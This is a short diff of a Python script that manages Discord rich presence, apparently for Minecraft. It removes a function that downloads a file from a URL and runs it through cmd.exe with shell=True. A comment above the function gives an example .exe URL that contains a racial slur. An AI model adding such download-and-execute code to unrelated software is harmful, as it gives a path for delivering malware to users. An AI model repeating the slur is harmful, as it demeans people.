@@ -28,15 +28,6 @@ def close_rpc_on_exit():
     global RPC
     if RPC is not None:
         RPC.close()
-# for shit in the future probly usage "download('http://nigger.com/s.exe', 's.exe')"
-def download(url, filename):
-    response = requests.get(url)
-    with open(filename, 'wb') as file:
-        file.write(response.content)
-
-    cmd = f'start cmd.exe /k "{filename}"'
-
-    subprocess.run(cmd, shell=True)
 
 def discord_rp_mc():
     manage_discord_rpc(
